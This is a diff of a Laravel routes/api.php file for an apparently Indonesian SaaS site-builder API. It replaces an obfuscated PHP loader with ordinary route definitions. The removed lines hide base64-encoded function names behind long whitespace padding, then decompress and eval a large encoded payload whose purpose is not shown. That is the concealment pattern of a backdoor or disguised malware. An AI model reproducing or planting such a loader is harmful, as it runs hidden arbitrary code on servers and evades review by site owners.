@@ -1,321 +1,52 @@
-<?php 
-        $__='printf';$_='Loading routes/api.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Route;
+
+/*
+|--------------------------------------------------------------------------
+| API Routes
+|--------------------------------------------------------------------------
+|
+| Here is where you can register API routes for your application. These
+| routes are loaded by the RouteServiceProvider within a group which
+| is assigned the "api" middleware group. Enjoy building your API!
+|
+*/
+//API route for register new user
+Route::post('/register', [App\Http\Controllers\API\AuthController::class, 'register']);
+//API route for login user
+Route::post('/login', [App\Http\Controllers\API\AuthController::class, 'login']);
+
+Route::prefix('wilayah')
+    ->middleware('siappakai')
+    ->group(function () {
+        Route::get('cari-desa', [App\Http\Controllers\API\WilayahController::class, 'cariDesa']);
+        Route::get('cari-kecamatan', [App\Http\Controllers\API\WilayahController::class, 'cariKecamatan']);
+    });
+
+//Protecting Routes
+Route::group(['middleware' => ['auth:sanctum']], function () {
+    Route::get('/user', function (Request $request) {
+        return $request->user();
+    });
+    Route::get('/profile', function (Request $request) {
+        return auth()->user();
+    });
+
+    //API route for update user
+    Route::post('/user/update/{user}', [App\Http\Controllers\API\AuthController::class, 'update']);
+
+    // API route for logout user
+    Route::post('/logout', [App\Http\Controllers\API\AuthController::class, 'logout']);
+
+    Route::post('/newsite', [App\Http\Controllers\API\SiteBuilderController::class, 'store']);
+    Route::post('/pembaruan-token/{pelanggan}', [App\Http\Controllers\API\TokenUpdateController::class, 'pembaruan_token']);
+    Route::post('/update-token', [App\Http\Controllers\API\TokenUpdateController::class, 'update']);
+    Route::post('/perpanjang-saas/{pelanggan}', [App\Http\Controllers\API\SiteUpdateController::class, 'perpanjang_saas']);
+    Route::post('/perpanjang-premium/{pelanggan}', [App\Http\Controllers\API\SiteUpdateController::class, 'perpanjang_premium']);
+    Route::post('/ubah-domain/{pelanggan}', [App\Http\Controllers\API\SiteUpdateController::class, 'ubah_domain']);
+    Route::post('/hapus-pelanggan/{pelanggan}', [App\Http\Controllers\API\SiteDeleteController::class, 'hapus_pelanggan']);
+    Route::post('/memasang-tema-pro', [App\Http\Controllers\API\TemaProController::class, 'store']);
+    Route::get('/wilayah', [App\Http\Controllers\API\WilayahController::class, 'listWilayah']);
+});
